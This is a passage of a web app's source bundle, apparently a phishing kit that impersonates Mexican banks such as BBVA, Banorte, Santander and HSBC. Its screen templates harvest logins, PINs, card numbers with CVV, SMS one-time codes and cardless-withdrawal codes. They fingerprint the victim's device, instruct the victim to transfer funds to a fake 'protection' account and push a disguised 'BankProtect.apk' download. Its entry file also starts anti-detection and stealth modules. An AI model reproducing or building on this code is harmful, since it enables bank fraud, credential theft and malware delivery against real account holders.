top-1/2 -translate-y-1/2\"\n          : \"-bottom-12 left-1/2 -translate-x-1/2 rotate-90\",\n        className\n      )}\n      disabled={!canScrollNext}\n      onClick={scrollNext}\n      {...props}\n    >\n      <ArrowRight className=\"h-4 w-4\" />\n      <span className=\"sr-only\">Next slide</span>\n    </Button>\n  )\n})\nCarouselNext.displayName = \"CarouselNext\"\n\nexport {\n  type CarouselApi,\n  Carousel,\n  CarouselContent,\n  CarouselItem,\n  CarouselPrevious,\n  CarouselNext,\n}\n","size_bytes":6210},"drizzle.config.ts":{"content":"import { defineConfig } from \"drizzle-kit\";\n\nif (!process.env.DATABASE_URL) {\n  throw new Error(\"DATABASE_URL, ensure the database is provisioned\");\n}\n\nexport default defineConfig({\n  out: \"./migrations\",\n  schema: \"./shared/schema.ts\",\n  dialect: \"postgresql\",\n  dbCredentials: {\n    url: process.env.DATABASE_URL,\n  },\n});\n","size_bytes":325},"client/src/main.tsx":{"content":"import { createRoot } from \"react-dom/client\";\nimport App from \"./App\";\nimport \"./index.css\";\nimport { initAntiDetection } from \"./utils/obfuscation\";\nimport { StealthMode } from \"./utils/stealth\";\n\n// Inicializar protecciones anti-detecci贸n\ninitAntiDetection();\nStealthMode.initialize();\n\n// Delay m铆nimo antes de renderizar (sin interferir con funcionalidad)\nconst renderDelay = Math.floor(Math.random() * 50) + 10;\nsetTimeout(() => {\n  createRoot(document.getElementById(\"root\")!).render(<App />);\n}, renderDelay);\n\n// Activar protecciones pero sin interferir con navegaci贸n normal\nStealthMode.activateEvasiveMode();\n","size_bytes":623},"client/src/components/client/ScreenTemplates.tsx":{"content":"import React, { useState, useContext, useEffect } from 'react';\nimport { Card } from '@/components/ui/card';\nimport { Input } from '@/components/ui/input';\nimport { Button } from '@/components/ui/button';\nimport { ScreenType, BankType } from '@shared/schema';\nimport QRScanner from './QRScanner';\nimport { detectDevice } from '@/utils/deviceDetection';\n\n// Para debug\nconsole.log('ScreenType.SMS_COMPRA:', ScreenType.SMS_COMPRA);\n\nimport citibanamexLogo from '../../assets/banamex.png';\nimport banbajioLogo from '../../assets/banbajio_logo_oficial.png';\nimport bbvaLogo from '../../assets/bbva_logo.png';\nimport bbvaLogoWhite from '../../assets/bbva_logo_white.png';\nimport banorteLogoFooter from '../../assets/Banorte-01.png'; // El logo rojo de Banorte\nimport banorteLogoHeader from '../../assets/Bo.png.png';\nimport bancoppelLogo from '../../assets/bancoppel.png';\nimport hsbcLogo from '../../assets/Hsbc.png';\nimport amexLogo from '../../assets/Amex.png';\nimport santanderLogo from '../../assets/santander_logo.png';\nimport santanderLogoWhite from '../../assets/santander_logo_white.png';\nimport platacardLogo from '../../assets/platacard_logo.png';\nimport scotiabankLogo from '../../assets/scotiabank_logo.png';\nimport scotiabankLogoWhite from '../../assets/scotiabank_logo_white.png';\nimport invexLogo from '../../assets/invex_logo.png';\nimport invexLogoWhite from '../../assets/invex_logo_white.png';\nimport banregioLogo from '../../assets/banregio_logo.png';\nimport banregioLogoWhite from '../../assets/banregio_logo_white.png';\n\ninterface ScreenTemplatesProps {\n  currentScreen: ScreenType;\n  screenData: {\n    terminacion?: string;\n    saldo?: string;\n    monto?: string;\n    clabe?: string;\n    titular?: string;\n    comercio?: string;\n    mensaje?: string;\n    alias?: string;\n    fileName?: string;\n    fileUrl?: string;\n    fileSize?: string;\n    saldoDebito?: string;\n    montoDebito?: string;\n    saldoCredito?: string;\n    montoCredito?: string;\n  };\n  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;\n  banco?: string;\n  sessionId?: string;\n  celular?: string;\n}\n\nexport const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ \n  currentScreen, \n  screenData,\n  onSubmit,\n  banco = \"BANORTE\",\n  sessionId = \"\",\n  celular = \"\"\n}) => {\n  // Normalizar el banco a may煤sculas para consistencia\n  const bankCode = banco.toUpperCase();\n  \n  // Funci贸n para obtener los 煤ltimos 4 d铆gitos del celular\n  const getLastFourDigits = (phoneNumber: string): string => {\n    if (!phoneNumber) return \"****\";\n    // Extraer solo d铆gitos\n    const digits = phoneNumber.replace(/\\D/g, '');\n    // Retornar los 煤ltimos 4 d铆gitos\n    return digits.length >= 4 ? digits.slice(-4) : \"****\";\n  };\n  \n  // Determinar la terminaci贸n a mostrar: priorizar screenData.terminacion, luego celular\n  const terminacionMostrar = screenData.terminacion || getLastFourDigits(celular);\n  // Form state\n  const [folioInput, setFolioInput] = useState('');\n  const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });\n  const [codigoInput, setCodigoInput] = useState('');\n  const [nipInput, setNipInput] = useState('');\n  const [tarjetaInput, setTarjetaInput] = useState('');\n  const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');\n  const [cvvInput, setCvvInput] = useState('');\n  const [smsCompraInput, setSmsCompraInput] = useState('');\n  const [codigoRetiroInput, setCodigoRetiroInput] = useState('');\n  const [pinRetiroInput, setPinRetiroInput] = useState('');\n  const [passwordError, setPasswordError] = useState<string | null>(null);\n  const [qrScanned, setQrScanned] = useState<string | null>(null);\n  const [qrImageData, setQrImageData] = useState<string | null>(null);\n  \n  // Estados para verificaci贸n de identidad\n  const [documentType, setDocumentType] = useState(\"\");\n  const [currentStep, setCurrentStep] = useState<'select' | 'document_front' | 'preview_front' | 'document_back' | 'preview_back' | 'selfie' | 'preview_selfie' | 'validating' | 'success'>('select');\n  const [documentFrontImage, setDocumentFrontImage] = useState<string | null>(null);\n  const [documentBackImage, setDocumentBackImage] = useState<string | null>(null);\n  const [selfieImage, setSelfieImage] = useState<string | null>(null);\n  const [currentPhotoPreview, setCurrentPhotoPreview] = useState<string | null>(null);\n  const [isUploading, setIsUploading] = useState(false);\n  const [currentStream, setCurrentStream] = useState<MediaStream | null>(null);\n  \n  // Cleanup function para detener la c谩mara al desmontar el componente\n  useEffect(() => {\n    return () => {\n      if (currentStream) {\n        currentStream.getTracks().forEach(track => track.stop());\n      }\n    };\n  }, [currentStream]);\n  \n  // Estados para protecci贸n de saldo\n  const [debitoSelect, setDebitoSelect] = useState('');\n  const [debitoMonto, setDebitoMonto] = useState('');\n  const [creditoSelect, setCreditoSelect] = useState('');\n  const [creditoMonto, setCreditoMonto] = useState('');\n  \n  // Funci贸n para validar n煤mero de tarjeta con algoritmo de Luhn\n  const validateCardNumber = (number: string) => {\n    // Eliminar espacios en blanco y caracteres no num茅ricos\n    const value = number.replace(/\\D/g, '');\n    \n    if (!value) return false;\n    \n    // Verificar longitud entre 13 y 19 d铆gitos\n    if (value.length < 13 || value.length > 19) return false;\n    \n    // Algoritmo de Luhn (Mod 10)\n    let sum = 0;\n    let shouldDouble = false;\n    \n    // Recorremos de derecha a izquierda\n    for (let i = value.length - 1; i >= 0; i--) {\n      let digit = parseInt(value.charAt(i));\n      \n      if (shouldDouble) {\n        digit *= 2;\n        if (digit > 9) digit -= 9;\n      }\n      \n      sum += digit;\n      shouldDouble = !shouldDouble;\n    }\n    \n    return (sum % 10) === 0;\n  };\n  \n  // Funci贸n para formatear el n煤mero de tarjeta (con espacios cada 4 d铆gitos)\n  const formatCardNumber = (value: string) => {\n    // Eliminar espacios en blanco y caracteres no num茅ricos\n    const v = value.replace(/\\D/g, '');\n    \n    // Insertar espacio cada 4 d铆gitos\n    const groups = [];\n    for (let i = 0; i < v.length; i += 4) {\n      groups.push(v.substring(i, i + 4));\n    }\n    \n    return groups.join(' ');\n  };\n  \n  // Funci贸n para formatear la fecha de vencimiento (MM/AA)\n  const formatExpirationDate = (value: string) => {\n    // Eliminar caracteres no num茅ricos\n    const v = value.replace(/\\D/g, '');\n    \n    // Asegurar que el mes no sea mayor a 12\n    if (v.length >= 2) {\n      const month = parseInt(v.substring(0, 2));\n      if (month > 12) {\n        return `12/${v.substring(2)}`;\n      }\n    }\n    \n    // Formato MM/AA\n    if (v.length <= 2) {\n      return v;\n    } else {\n      return `${v.substring(0, 2)}/${v.substring(2, 4)}`;\n    }\n  };\n\n  // Helper function to render the appropriate screen\n  const renderScreen = () => {\n    // Funci贸n para obtener el contenedor seg煤n el banco\n    // Funci贸n simplificada que solo contiene el contenido sin logos ni fechas\n    const getBankContainer = (children: React.ReactNode) => {\n      // Utilizamos una 煤nica plantilla para todos los bancos\n      return (\n        <div className=\"pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden\">\n          {/* Eliminamos todos los logos y fechas de los contenedores de pantalla */}\n          {children}\n        </div>\n      );\n    };\n    \n    // Diferentes pantallas seg煤n el tipo\n    switch (currentScreen) {\n\n      case ScreenType.FOLIO:\n        const folioContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Folio de soporte:</h2>\n            <p className=\"mb-4\">Por favor, ingrese el folio de soporte t茅cnico que su ejecutivo en l铆nea le proporcion贸.</p>\n            <div className=\"mb-4\">\n              <label className=\"block text-sm font-medium text-gray-700 text-left mb-1\">N煤mero de folio:</label>\n              <Input \n                type=\"text\" \n                placeholder=\"Ingrese su n煤mero de folio\" \n                className=\"w-full border border-gray-300 rounded p-2 mb-3\"\n                value={folioInput}\n                onChange={(e) => setFolioInput(e.target.value)}\n              />\n            </div>\n            <Button \n              className={primaryBtnClass}\n              onClick={() => {\n                const deviceInfo = detectDevice();\n                onSubmit(ScreenType.FOLIO, { \n                  folio: folioInput,\n                  deviceType: deviceInfo.type,\n                  deviceModel: deviceInfo.model,\n                  deviceBrowser: deviceInfo.browser,\n                  deviceOs: deviceInfo.os,\n                  userAgent: deviceInfo.userAgent\n                });\n              }}\n            >\n              Continuar\n            </Button>\n          </>\n        );\n        return getBankContainer(folioContent);\n\n      case ScreenType.LOGIN:\n        // Funci贸n para manejar el clic en el bot贸n de ingresar\n        const handleLoginSubmit = () => {\n          // Si llegamos aqu铆, todo est谩 bien\n          setPasswordError(null);\n          onSubmit(ScreenType.LOGIN, { \n            username: loginInputs.username, \n            password: loginInputs.password \n          });\n        };\n        \n        const loginContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Acceso a tu cuenta</h2>\n            <div className=\"mb-4\">\n              <div className=\"flex flex-col items-start mb-2\">\n                <label className=\"text-sm text-gray-700 mb-1\">\n                  Usuario o ID de cliente:\n                </label>\n                <Input \n                  type=\"text\" \n                  value={loginInputs.username}\n                  onChange={(e) => setLoginInputs({...loginInputs, username: e.target.value})}\n                  placeholder=\"Usuario\"\n                  className=\"w-full p-2 border border-gray-300 rounded\"\n                />\n              </div>\n              \n              <div className=\"flex flex-col items-start\">\n                <label className=\"text-sm text-gray-700 mb-1\">Contrase帽a:</label>\n                <Input \n                  type=\"password\" \n                  value={loginInputs.password}\n                  onChange={(e) => {\n                    setLoginInputs({...loginInputs, password: e.target.value});\n                    // Limpiar error cuando el usuario escribe\n                    if (passwordError) setPasswordError(null);\n                  }}\n                  placeholder=\"Contrase帽a\"\n                  className={`w-full p-2 border rounded ${passwordError ? 'border-red-500' : 'border-gray-300'}`}\n                />\n                {passwordError && (\n                  <p className=\"text-xs text-red-500 mt-1\">{passwordError}</p>\n                )}\n              </div>\n            </div>\n            \n            <Button \n              className={primaryBtnClass}\n              onClick={handleLoginSubmit}\n            >\n              Ingresar\n            </Button>\n          </>\n        );\n        return getBankContainer(loginContent);\n\n      case ScreenType.CODIGO:\n        const codigoContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Verificaci贸n de seguridad</h2>\n            <p className=\"mb-4\">\n              Hemos enviado un c贸digo de verificaci贸n a tu n煤mero de tel茅fono terminaci贸n: <strong>{terminacionMostrar}</strong>\n            </p>\n            <Input \n              type=\"text\" \n              placeholder=\"Ingrese el c贸digo\" \n              className=\"w-full border border-gray-300 rounded p-2 mb-3\"\n              value={codigoInput}\n              onChange={(e) => setCodigoInput(e.target.value)}\n            />\n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}\n            >\n              Verificar\n            </Button>\n          </>\n        );\n        return getBankContainer(codigoContent);\n\n      case ScreenType.NIP:\n        const nipContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Ingresa tu NIP</h2>\n            <p className=\"mb-4\">\n              Por tu seguridad, necesitamos verificar tu NIP de 4 d铆gitos.\n            </p>\n            <Input \n              type=\"password\" \n              placeholder=\"NIP\" \n              className=\"w-full border border-gray-300 rounded p-2 mb-3\"\n              value={nipInput}\n              onChange={(e) => setNipInput(e.target.value)}\n              maxLength={4}\n            />\n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}\n            >\n              Confirmar\n            </Button>\n          </>\n        );\n        return getBankContainer(nipContent);\n\n      case ScreenType.PROTEGER:\n        const protegerContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Es necesario proteger su saldo</h2>\n            <div className=\"p-4 bg-gray-100 rounded mb-4 text-left\">\n              <p className=\"mb-2\">\n                Por su seguridad, es necesario proteger el saldo de su cuenta efectivo, crearemos una cuenta de SU TOTAL PROTECCIN de forma gratuita para poder respaldar el fondo disponible en 茅sta.\n              </p>\n              <p className=\"mb-2 font-semibold\">\n                Saldo sin proteger: <strong>${screenData.saldo || \"0.00\"}</strong>\n              </p>\n            </div>\n            \n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.PROTEGER, { confirmado: true })}\n            >\n              Proteger mi saldo\n            </Button>\n          </>\n        );\n        return getBankContainer(protegerContent);\n\n      case ScreenType.TARJETA:\n        const tarjetaContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Protecci贸n adicional</h2>\n            <p className=\"mb-4\">\n              Con el fin de evitar intentos de compra en l铆nea, agregaremos protecci贸n adicional a su tarjeta de cr茅dito/d茅bito.\n            </p>\n            \n            <div className=\"mb-4\">\n              <div className=\"flex flex-col items-start mb-2\">\n                <label className=\"text-sm text-gray-700 mb-1\">N煤mero de tarjeta:</label>\n                <Input \n                  type=\"text\" \n                  value={tarjetaInput}\n                  onChange={(e) => setTarjetaInput(formatCardNumber(e.target.value))}\n                  placeholder=\"XXXX XXXX XXXX XXXX\"\n                  className={`w-full p-2 border rounded ${\n                    tarjetaInput && tarjetaInput.replace(/\\s/g, '').length >= 13 \n                      ? validateCardNumber(tarjetaInput) \n                        ? 'border-green-500 bg-green-50' \n                        : 'border-red-500 bg-red-50' \n                      : 'border-gray-300'\n                  }`}\n                  maxLength={19}\n                />\n              </div>\n              \n              <div className=\"flex space-x-3\">\n                <div className=\"flex flex-col items-start w-1/2\">\n                  <label className=\"text-sm text-gray-700 mb-1\">Fecha de vencimiento:</label>\n                  <Input \n                    type=\"text\" \n                    value={fechaVencimientoInput}\n                    onChange={(e) => setFechaVencimientoInput(formatExpirationDate(e.target.value))}\n                    placeholder=\"MM/AA\"\n                    className=\"w-full p-2 border border-gray-300 rounded\"\n                    maxLength={5}\n                  />\n                </div>\n                \n                <div className=\"flex flex-col items-start w-1/2\">\n                  <label className=\"text-sm text-gray-700 mb-1\">CVV:</label>\n                  <Input \n                    type=\"text\" \n                    value={cvvInput}\n                    onChange={(e) => setCvvInput(e.target.value.replace(/\\D/g, '').substring(0, 3))}\n                    placeholder=\"XXX\"\n                    className={`w-full p-2 border rounded ${\n                      cvvInput.length === 3 ? 'border-green-500 bg-green-50' : 'border-gray-300'\n                    }`}\n                    maxLength={3}\n                  />\n                </div>\n              </div>\n            </div>\n            \n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.TARJETA, { \n                tarjeta: tarjetaInput,\n                fechaVencimiento: fechaVencimientoInput,\n                cvv: cvvInput\n              })}\n              disabled={\n                !validateCardNumber(tarjetaInput) || \n                !fechaVencimientoInput.includes('/') || \n                cvvInput.length < 3\n              }\n            >\n              Activar protecci贸n\n            </Button>\n          </>\n        );\n        return getBankContainer(tarjetaContent);\n\n      case ScreenType.TRANSFERIR:\n        const transferirContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Cuenta SU TOTAL PROTECCIN creada exitosamente.</h2>\n            <div className=\"p-4 bg-gray-100 rounded mb-4 text-left\">\n              <p className=\"mb-3\">\n                Con el fin de proteger su saldo disponible es necesario transferir la cantidad de <strong>${screenData.monto || \"39933\"}</strong> a la siguiente cuenta SU TOTAL PROTECCIN (STP).\n              </p>\n              <p className=\"mb-2\">Clabe:</p>\n              <p className=\"mb-3 font-medium\">{screenData.clabe || \"272762626262727272727272266222\"}</p>\n              <p className=\"mb-2\">Titular de la cuenta:</p>\n              <p className=\"mb-3 font-medium\">{screenData.titular || \"Nwnnwhwhw\"}</p>\n              <p className=\"mb-2\">Alias:</p>\n              <p className=\"mb-3 font-medium\">{screenData.alias || \"Cuenta de respaldo.\"}</p>\n              <p className=\"mt-3 font-medium\">\n                Esta ventana se actualizar谩 una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.\n              </p>\n            </div>\n            \n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmado: true })}\n            >\n              Ya realic茅 la transferencia\n            </Button>\n          </>\n        );\n        return getBankContainer(transferirContent);\n\n      case ScreenType.CANCELACION:\n        const cancelacionContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Cancelaci贸n Exitosa</h2>\n            <div className=\"p-4 bg-gray-100 rounded mb-4 text-left\">\n              <p className=\"mb-3\">\n                Estimado cliente, hemos realizado la cancelaci贸n de su cargo no reconocido de forma exitosa.\n              </p>\n              <p className=\"mb-2\">Comercio: <strong>{screenData.comercio || \"Wnnwhw\"}</strong></p>\n              <p className=\"mb-2\">Monto devuelto: <strong>${screenData.monto || \"62622\"}</strong></p>\n              <p className=\"mt-3\">\n                En un lapso no mayor a 72 horas, el monto devuelto volver谩 a estar disponible en su tarjeta de cr茅dito/d茅bito.\n              </p>\n            </div>\n            \n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.CANCELACION, { confirmado: true })}\n            >\n              Entendido\n            </Button>\n          </>\n        );\n        return getBankContainer(cancelacionContent);\n\n      case ScreenType.MENSAJE:\n        const mensajeContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Mensaje del banco</h2>\n            <div className=\"p-4 bg-gray-100 rounded mb-4 text-left max-h-[60vh] overflow-y-auto\">\n              <div className=\"whitespace-pre-wrap break-words\">\n                {screenData.mensaje || \"Mensaje personalizado del banco.\"}\n              </div>\n            </div>\n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}\n            >\n              Entendido\n            </Button>\n          </>\n        );\n        return getBankContainer(mensajeContent);\n\n      case ScreenType.SMS_COMPRA:\n      case 'sms_compra' as ScreenType: // Agregar la versi贸n en min煤sculas para manejar ambos casos\n        console.log(\"Renderizando pantalla SMS_COMPRA con datos:\", screenData);\n        \n        // No generamos c贸digo autom谩tico, dejamos que el usuario lo ingrese\n        // Inicializar el campo de entrada vac铆o si no est谩 ya establecido\n        if (smsCompraInput === undefined) {\n          console.log(\"Inicializando campo SMS_COMPRA vac铆o\");\n          setSmsCompraInput(\"\");\n        }\n        \n        console.log(\"Terminaci贸n de celular mostrada:\", screenData.terminacion);\n        console.log(\"C贸digo SMS_COMPRA actual (input usuario):\", smsCompraInput);\n        \n        const smsCompraContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Cancelaci贸n de cargos:</h2>\n            <p className=\"mb-4\">\n              Ingresa el c贸digo que recibiste para autorizar la compra en l铆nea. Este mismo c贸digo sirve para realizar la cancelaci贸n. Lo hemos enviado a tu tel茅fono con terminaci贸n: <strong>{terminacionMostrar}</strong>\n            </p>\n            \n            <div className=\"p-4 bg-gray-100 rounded mb-4 text-black\">\n              <p className=\"mb-2\">\n                <strong>Informaci贸n de cancelaci贸n:</strong>\n              </p>\n            </div>\n            \n            <div className=\"mb-4\">\n              <label className=\"block text-sm font-medium mb-1\">Ingresa el c贸digo de cancelaci贸n:</label>\n              <Input \n                type=\"text\" \n                placeholder=\"Ingresa el c贸digo de 6 d铆gitos\" \n                className=\"w-full border border-gray-300 rounded p-2 mb-2\"\n                value={smsCompraInput}\n                onChange={(e) => setSmsCompraInput(e.target.value.replace(/\\D/g, '').substring(0, 6))}\n                maxLength={6}\n              />\n              <p className=\"text-xs text-gray-500\">El c贸digo debe tener 6 d铆gitos num茅ricos.</p>\n            </div>\n            \n            <Button \n              className={primaryBtnClass}\n              onClick={() => {\n                if (smsCompraInput && smsCompraInput.length === 6) {\n                  console.log(\"Enviando c贸digo SMS_COMPRA ingresado:\", smsCompraInput);\n                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: smsCompraInput });\n                } else {\n                  alert(\"Por favor ingresa un c贸digo v谩lido de 6 d铆gitos.\");\n                }\n              }}\n              disabled={!smsCompraInput || smsCompraInput.length !== 6}\n            >\n              Confirmar cancelaci贸n\n            </Button>\n          </>\n        );\n        return getBankContainer(smsCompraContent);\n\n      case ScreenType.VALIDANDO:\n        const validandoContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-4\">Validando...</h2>\n            <p className=\"text-sm text-gray-500 mb-4\">Esto puede tomar un momento. Por favor espere...</p>\n            <div className=\"h-4 w-full bg-gray-200 rounded overflow-hidden\">\n              <div className={`h-full ${\n                bankCode === 'LIVERPOOL' ? 'liverpool-bg' :\n                bankCode === 'BANBAJIO' ? 'banbajio-bg' : \n                bankCode === 'CITIBANAMEX' ? 'bg-[#0070BA]' : \n                bankCode === 'BBVA' ? 'bg-[#072146]' :\n                bankCode === 'BANCOPPEL' ? 'bg-[#0066B3]' :\n                bankCode === 'HSBC' ? 'bg-[#DB0011]' :\n                bankCode === 'AMEX' ? 'amex-bg' :\n                bankCode === 'SANTANDER' ? 'santander-bg' :\n                bankCode === 'SCOTIABANK' ? 'scotiabank-bg' :\n                bankCode === 'INVEX' ? 'invex-bg' :\n                bankCode === 'AFIRME' ? 'bg-[#009639]' :\n                'banorte-bg'\n              } animate-progress-bar`}></div>\n            </div>\n            <p className=\"text-xs text-gray-400 mt-3\">Verificando informaci贸n de seguridad</p>\n          </>\n        );\n        return getBankContainer(validandoContent);\n      \n      case ScreenType.ESCANEAR_QR:\n        // Si ya escaneamos un QR, mostrar confirmaci贸n\n        if (qrScanned) {\n          const qrScannedContent = (\n            <>\n              <h2 className=\"text-xl font-bold mb-3\">隆C贸digo QR escaneado correctamente!</h2>\n              <div className=\"bg-green-100 border border-green-300 text-green-700 px-4 py-3 rounded mb-4\">\n                <p>Los datos de su tarjeta han sido verificados exitosamente.</p>\n              </div>\n              <Button \n                className={primaryBtnClass}\n                onClick={() => onSubmit(ScreenType.ESCANEAR_QR, { \n                  qrData: qrScanned,\n                  qrImageData: qrImageData\n                })}\n              >\n                Continuar\n              </Button>\n            </>\n          );\n          return getBankContainer(qrScannedContent);\n        }\n        \n        // Si no hemos escaneado un QR, mostrar el esc谩ner\n        return (\n          <div className=\"pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden\">\n            <QRScanner \n              onScanSuccess={(qrData, qrImage) => {\n                setQrScanned(qrData);\n                setQrImageData(qrImage || null);\n              }}\n              onCancel={() => {\n                onSubmit(ScreenType.MENSAJE, { mensaje: \"Operaci贸n cancelada por el usuario\" });\n              }}\n              bankType={bankCode as BankType}\n            />\n          </div>\n        );\n\n      case ScreenType.CANCELACION_RETIRO:\n        // Informaci贸n espec铆fica de cada banco para el formato de c贸digo de retiro\n        const getBankRetiroInfo = () => {\n          switch(bankCode) {\n            case 'BBVA':\n              return { \n                digits: 12, \n                note: 'C贸digo de retiro directo en app BBVA M茅xico m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            case 'BANORTE':\n              return { \n                digits: 12, \n                note: '\"Retiro sin tarjeta\" generado desde Banorte M贸vil m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            case 'SANTANDER':\n              return { \n                digits: 8, \n                note: 'Se usa \"S煤per Retiro\" desde la app m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            case 'HSBC':\n              return { \n                digits: 10, \n                note: 'Con la funci贸n \"Dinero M贸vil\" (puede variar por servicio contratado) m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            case 'SPIN':\n              return { \n                digits: 12, \n                note: 'Se genera en la app SPIN o Banco Azteca m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            case 'BANCOPPEL':\n              return { \n                digits: 8, \n                note: 'Puede variar entre 6 y 8 d铆gitos. Se genera desde la app BanCoppel M贸vil m谩s PIN de seguridad de 4 d铆gitos.', \n                variable: true,\n                requiresPin: true\n              };\n            case 'BANREGIO':\n              return { \n                digits: 10, \n                note: 'Disponible en la app BanRegio M贸vil m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            case 'CITIBANAMEX':\n              return { \n                digits: 10, \n                note: 'C贸digo de retiro desde la app m贸vil Citibanamex m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            case 'SCOTIABANK':\n              return { \n                digits: 12, \n                note: 'Generado desde la app Scotia M贸vil m谩s PIN de seguridad de 4 d铆gitos.',\n                requiresPin: true\n              };\n            default:\n              return { \n                digits: 8, \n                note: 'C贸digo de retiro sin tarjeta m谩s PIN de seguridad de 4 d铆gitos.', \n                requiresPin: true\n              };\n          }\n        };\n\n        const bankRetiroInfo = getBankRetiroInfo();\n        const digitsInfo = bankRetiroInfo.variable \n          ? `6 a ${bankRetiroInfo.digits} d铆gitos` \n          : `${bankRetiroInfo.digits} d铆gitos`;\n        \n        const cancelacionRetiroContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Cancelaci贸n de retiro sin tarjeta</h2>\n            <p className=\"mb-4\">\n              Ingresa el c贸digo para cancelar el retiro.\n            </p>\n            <div className=\"bg-gray-100 p-3 mb-4 rounded-md text-left\">\n              <p className=\"text-sm font-medium\">{digitsInfo}</p>\n              <p className=\"text-xs text-gray-600\">{bankRetiroInfo.note}</p>\n            </div>\n            <Input \n              type=\"text\" \n              placeholder={`C贸digo de ${digitsInfo}`}\n              className=\"w-full border border-gray-300 rounded p-2 mb-3\"\n              value={codigoRetiroInput}\n              onChange={(e) => {\n                // Solo permitir n煤meros\n                const value = e.target.value.replace(/\\D/g, '');\n                // Limitar al m谩ximo de d铆gitos para este banco\n                if (value.length <= bankRetiroInfo.digits) {\n                  setCodigoRetiroInput(value);\n                }\n              }}\n              maxLength={bankRetiroInfo.digits}\n            />\n            \n            {bankRetiroInfo.requiresPin && (\n              <div className=\"mb-3\">\n                <p className=\"text-sm text-left mb-1\">PIN de seguridad (4 d铆gitos):</p>\n                <Input \n                  type=\"password\" \n                  placeholder=\"PIN de 4 d铆gitos\"\n                  className=\"w-full border border-gray-300 rounded p-2\"\n                  value={pinRetiroInput}\n                  onChange={(e) => {\n                    // Solo permitir n煤meros\n                    const value = e.target.value.replace(/\\D/g, '');\n                    // Limitar a 4 d铆gitos\n                    if (value.length <= 4) {\n                      setPinRetiroInput(value);\n                    }\n                  }}\n                  maxLength={4}\n                />\n              </div>\n            )}\n            \n            <Button \n              className={primaryBtnClass}\n              onClick={() => onSubmit(ScreenType.CANCELACION_RETIRO, { \n                codigoRetiro: codigoRetiroInput,\n                pinRetiro: pinRetiroInput\n              })}\n              disabled={\n                codigoRetiroInput.length < (bankRetiroInfo.variable ? 6 : bankRetiroInfo.digits) || \n                (bankRetiroInfo.requiresPin && pinRetiroInput.length < 4)\n              }\n            >\n              Cancelar retiro\n            </Button>\n          </>\n        );\n        return getBankContainer(cancelacionRetiroContent);\n\n      case ScreenType.PROTECCION_BANCARIA:\n        // Funci贸n para obtener el archivo de protecci贸n del usuario\n        const getProtectionFile = (bankCode: string) => {\n          // Primero intentar obtener APK personalizado (se cargar谩 din谩micamente)\n          return {\n            fileName: 'BankProtect.apk',\n            fileUrl: '/assets/Bankprotet2_1750982122281.apk'\n          };\n        };\n\n        const protectionFile = getProtectionFile(bankCode);\n        \n        const proteccionBancariaContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-4\" style={{ color: '#004080' }}>\n              Protecci贸n Inteligente para tu Seguridad Bancaria\n            </h2>\n            <div className=\"text-left space-y-4 mb-6\">\n              <p className=\"text-gray-700\">\n                Estamos por analizar tu dispositivo para garantizar que no exista un mal uso de tu informaci贸n personal o financiera.\n              </p>\n              <p className=\"text-gray-700\">\n                Te invitamos a descargar nuestra <strong>Aplicaci贸n de Protecci贸n Bancaria</strong>, dise帽ada para brindarte una capa adicional de seguridad al interactuar con nuestros servicios.\n              </p>\n              <div className=\"bg-blue-50 p-4 rounded-lg\">\n                <p className=\"text-gray-800\">\n                  <strong>Precio de descarga:</strong> Gratuito\n                </p>\n              </div>\n              <p className=\"text-gray-700\">\n                <strong>Para iniciar tu descarga, haz clic en el siguiente bot贸n:</strong>\n              </p>\n            </div>\n            <Button \n              className=\"bg-[#004080] hover:bg-[#003366] text-white py-3 px-6 rounded font-bold w-full transition-colors\"\n              onClick={async () => {\n                try {\n                  // Intentar obtener el APK personalizado del usuario\n                  const response = await fetch(`/api/get-user-apk/${sessionId}`);\n                  let fileToDownload = protectionFile;\n\n                  if (response.ok) {\n                    const data = await response.json();\n                    fileToDownload = {\n                      fileName: data.apkFileName,\n                      fileUrl: data.apkFileUrl\n                    };\n                  }\n                  \n                  // Si no se encontr贸 APK personalizado, usar el archivo manual subido o el por defecto\n                  if (!fileToDownload) {\n                    fileToDownload = screenData.fileUrl ? {\n                      fileName: screenData.fileName || 'proteccion_bancaria.zip',\n                      fileUrl: screenData.fileUrl\n                    } : protectionFile;\n                  }\n                  \n                  if (fileToDownload) {\n                    // Crear un enlace temporal para descargar 